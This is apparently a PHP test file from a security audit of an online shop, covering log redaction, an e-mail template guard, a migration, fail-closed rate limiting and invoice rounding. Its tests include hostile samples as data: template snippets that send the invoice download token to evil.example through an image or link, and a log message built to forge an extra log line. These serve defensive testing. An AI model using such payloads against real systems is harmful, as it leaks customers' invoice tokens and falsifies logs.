<?php

// Round 9 review (2026-10-23), technical leftovers and low findings.
echo "\n--- Audit round 9 (low): logging, templates, leftovers ---\n";

// Logger::phpLog: a secret inside JSON ("client_secret":"x") or under a longer key (stripe_secret_key) was written in
// clear, and a CR/LF in an exception message started a forged line of its own in the PHP error log.
$r9lLogDir = sys_get_temp_dir() . '/bbe-r9low-log-' . bin2hex(random_bytes(4));
mkdir($r9lLogDir);
$r9lPhpLog = $r9lLogDir . '/php-error.log';
$r9lPrevLog = ini_set('error_log', $r9lPhpLog);
try {
    Logger::phpLog('PayU token error: {"access_token":"r9l-tok-1","client_secret": "r9l-cs-2","stripe_secret_key":"sk_live_r9l3","order_id":7}'
        . " url?token=r9l-q4&page=2\n[24-Oct-2026 02:00:00 UTC] PHP Fatal error: forged by input\r\x07end");
} finally {
    ini_set('error_log', (string)$r9lPrevLog);
}
$r9lLogged = (string)@file_get_contents($r9lPhpLog);
@unlink($r9lPhpLog);
@rmdir($r9lLogDir);
assert_true(!preg_match('/r9l-tok-1|r9l-cs-2|sk_live_r9l3|r9l-q4/', $r9lLogged) && str_contains($r9lLogged, '"order_id":7') && str_contains($r9lLogged, '&page=2'),
    "R9 logs: the PHP log masks JSON and query-string secrets and keeps the rest ({$r9lLogged})");
assert_true(substr_count(rtrim($r9lLogged, "\r\n"), "\n") === 0 && str_contains($r9lLogged, '\n[24-Oct-2026') && str_contains($r9lLogged, '\r\x07end'),
    'R9 logs: CR/LF and control characters are escaped, so the message stays one line and cannot forge another');
assert_equals(['response' => '{"access_token":"[REDACTED]","expires_in":3600}'], Logger::redact(['response' => '{"access_token":"r9l-tok-5","expires_in":3600}']),
    'R9 logs: the structured log masks a token inside a JSON string as well');

// Template guard: the invoice link carries the download token (#token) but was not a secret variable, so an override
// could put it into an image or another site's URL and hand the invoice to that server.
$r9lInvoiceErrors = static fn(string $html, string $text = ''): string => implode(' ', EmailTemplates::validate('invoice_issued', 'Invoice {{invoice_number}}', $html, $text));
$r9lShipped = EmailTemplates::fileSource('invoice_issued', 'en');
assert_equals('', $r9lInvoiceErrors((string)$r9lShipped['html'], (string)($r9lShipped['text'] ?? '')), 'R9 template guard: the shipped invoice e-mail (link and plain URL) passes');
foreach (['<p><img src="https://evil.example/p.gif?u={{invoice_download_url}}" alt=""></p>', '<p><a href="https://evil.example/?next={{invoice_download_url}}">Invoice</a></p>',
    '<p><a href="{{invoice_download_url}}" title="{{invoice_download_url}}">Invoice</a></p>'] as $r9lLeak) {
    assert_true(str_contains($r9lInvoiceErrors($r9lLeak), 'invoice_download_url'), 'R9 template guard: the invoice link may not be part of another URL or attribute (' . $r9lLeak . ')');
}

// orders.delivered_at migration: it returned as soon as the column existed, so a run that stopped after the ALTER (a MySQL
// ALTER commits on its own) never backfilled the delivered orders. The backfill now runs for delivered orders still
// without a date, and keeps a date already recorded.
$r9lDa = new PDO('sqlite::memory:', null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$r9lDa->exec("CREATE TABLE orders (id INTEGER PRIMARY KEY, status TEXT, created_at TEXT, updated_at TEXT, delivered_at TEXT DEFAULT NULL)");
$r9lDa->exec("CREATE TABLE shipments (id INTEGER PRIMARY KEY, order_id INTEGER, delivered_at TEXT)");
$r9lDa->exec("INSERT INTO orders VALUES (1, 'delivered', '2026-10-01 08:00:00', '2026-10-05 09:00:00', NULL), (2, 'delivered', '2026-10-01 08:00:00', '2026-10-06 09:00:00', '2026-10-02 10:00:00'),
    (3, 'paid', '2026-10-01 08:00:00', '2026-10-02 09:00:00', NULL)");
$r9lDa->exec("INSERT INTO shipments VALUES (1, 1, '2026-10-04 12:00:00')");
$r9lDaMigration = require TEST_CLI_DIR . '/../migrations/20261020140000_order_delivered_at.php';
$r9lDaMigration->up($r9lDa, true);
$r9lDaMigration->up($r9lDa, true);
assert_equals(['2026-10-04 12:00:00', '2026-10-02 10:00:00', null], $r9lDa->query('SELECT delivered_at FROM orders ORDER BY id')->fetchAll(PDO::FETCH_COLUMN),
    'R9 migrations: a re-run of the delivered_at migration backfills a delivered order the stopped run left without a date, keeps a recorded date');
$r9lDa = null;

// Rate limiter: when its storage failed (read-only/full disk) every check let the request through, logins and password
// resets included, i.e. unlimited password guessing during the outage; the admin login crashed with a 500.
$r9lRateFile = sys_get_temp_dir() . '/r9l-rate-' . bin2hex(random_bytes(4)) . '.sqlite';
(new PDO('sqlite:' . $r9lRateFile))->exec('CREATE TABLE hits (key TEXT NOT NULL, ts INTEGER NOT NULL); CREATE INDEX idx_hits ON hits(key, ts)');
try {
    Security::setRateDbForTesting(new PDO('sqlite:' . $r9lRateFile, null, null, [constant(class_exists('Pdo\Sqlite') ? 'Pdo\Sqlite::ATTR_OPEN_FLAGS' : 'PDO::SQLITE_ATTR_OPEN_FLAGS') => constant(class_exists('Pdo\Sqlite') ? 'Pdo\Sqlite::OPEN_READONLY' : 'PDO::SQLITE_OPEN_READONLY')]));
    $r9lRateErrorLog = ini_set('error_log', sys_get_temp_dir() . '/r9l-rate-error.log');
    try {
        $r9lRate = [Security::rateLimit('r9l_rate', 5), Security::rateLimit('r9l_login', 5, 60, true, true)];
        $r9lAdmin = (new ReflectionMethod(Security::class, 'reserveAdminLogin'))->invoke(null, 'r9l-admin', '203.0.113.9');
    } finally {
        ini_set('error_log', (string)$r9lRateErrorLog);
        http_response_code(200);
    }
    assert_equals([true, false], $r9lRate, 'R9 rate limit: a broken limiter store still lets ordinary requests through but refuses a credential check');
    assert_equals([null, 60], $r9lAdmin, 'R9 rate limit: the admin login is refused for a minute instead of crashing when the throttle store is broken');
} finally {
    Security::setRateDbForTesting(new PDO('sqlite::memory:'));
    @unlink($r9lRateFile);
}
$r9lAccountSrc = (string)file_get_contents(dirname(TEST_CLI_DIR) . '/src/Entrypoints/Storefront/Account.php');
preg_match_all("/rateLimit\\('account_(login|reset|change_password)[^;]*/", $r9lAccountSrc, $r9lCredentialChecks);
assert_true(count($r9lCredentialChecks[0]) === 6 && array_filter($r9lCredentialChecks[0], static fn(string $c): bool => !preg_match('/, true\)/', $c)) === [],
    'R9 rate limit: every customer login, reset and password-change check is fail-closed (' . count($r9lCredentialChecks[0]) . ')');

// CZK/HUF invoices: each line was rounded to whole units on its own, so the printed lines were 1 Kč/Ft off the
// total under them (three lines of 813.50 net at 21 % printed 814 + 814 + 814, total 2 440.50 → 2 441).
$r9lInvoice = ['locale' => 'en', 'currency' => 'czk', 'type' => 'invoice', 'number' => 'R9L-2026-1', 'order_id' => 97901,
    'issued_at' => '2026-10-24', 'delivery_date' => '2026-10-24', 'due_date' => '2026-11-07', 'payment_method' => 'Transfer',
    'total_net' => 244050, 'total_vat' => 51250, 'total_gross' => 295300];
$r9lRows = [];
foreach ([[81350, 98433], [81350, 98433], [81350, 98434]] as $r9lLine) $r9lRows[] = ['name' => 'R9L lamp', 'qty' => 1, 'rate' => 21.0, 'net' => $r9lLine[0], 'gross' => $r9lLine[1]];
$r9lPdf = (string)(new ReflectionMethod(InvoiceService::class, 'renderPdf'))->invoke(null, $r9lInvoice, $r9lRows, ['name' => 'R9L s.r.o.'], ['name' => 'Buyer'],
    ['rates' => ['21' => ['net' => 244050, 'vat' => 51250]]]);
preg_match_all('/\((.*?)\) Tj/', $r9lPdf, $r9lRuns);
$r9lUnits = static fn(string $run): int => (int)preg_replace('/\D/', '', (string)preg_replace('/^[^:]*:\s*/', '', $run));
$r9lNet = $r9lGross = 0;
foreach ($r9lRuns[1] as $r9lI => $r9lRun) {
    if ($r9lRun !== '21%' || ($r9lRuns[1][$r9lI - 3] ?? '') !== 'R9L lamp') continue;
    $r9lNet += $r9lUnits($r9lRuns[1][$r9lI + 1]);
    $r9lGross += $r9lUnits($r9lRuns[1][$r9lI + 2]);
}
$r9lTotal = static function (string $label) use ($r9lRuns, $r9lUnits): ?int {
    foreach ($r9lRuns[1] as $run) if (str_starts_with($run, $label . ':')) return $r9lUnits($run);
    return null;
};
$r9lPrinted = [$r9lTotal('Total net'), $r9lTotal('Total VAT'), $r9lTotal('Total due')];
assert_equals([2441, 2953], [$r9lNet, $r9lGross], 'R9 invoice: the whole-koruna lines add up to the printed totals (' . json_encode($r9lPrinted) . ')');
assert_equals([2441, 512, 2953], $r9lPrinted, 'R9 invoice: the printed net and VAT totals add up to the amount due in whole koruna');
assert_equals([[81400, 81300, 81400], [81350, 81350, 81350]],
    [InvoiceService::displayAmounts([81350, 81350, 81350], 'czk'), InvoiceService::displayAmounts([81350, 81350, 81350], 'eur')],
    'R9 invoice: CZK lines are rounded cumulatively, two-decimal currencies are left as they are');
